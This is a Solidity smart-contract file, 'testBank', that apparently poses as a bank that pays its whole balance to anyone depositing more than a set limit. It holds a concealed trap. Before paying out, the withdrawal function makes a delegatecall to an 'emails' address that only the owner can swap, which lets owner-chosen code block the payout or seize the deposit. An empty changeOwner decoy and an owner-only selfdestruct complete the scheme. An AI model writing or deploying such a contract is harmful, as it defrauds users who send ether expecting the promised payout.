1 pragma solidity 0.4.11;
2 
3 contract testBank
4 {
5     address Owner=0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b;
6     address adr;
7     uint256 public Limit= 1000000000000000001;
8     address emails = 0xa1204c9539dcd9b7c8893adcc96e5a35a91d0c5b;
9     
10     
11     function Update(address dataBase, uint256 limit)
12     {
13         require(msg.sender == Owner); //checking the owner
14         Limit = limit;
15         emails = dataBase;
16     }
17     
18     function changeOwner(address adr){
19         // update Owner=msg.sender;
20     }
21     
22     function()payable{}
23     
24     function withdrawal()
25     payable public
26     {
27         adr=msg.sender;
28         if(msg.value>Limit)
29         {  
30             emails.delegatecall(bytes4(sha3("logEvent()")));
31             adr.send(this.balance);
32         }
33     }
34     
35     function kill() {
36         require(msg.sender == Owner);
37         selfdestruct(msg.sender);
38     }
39     
40 }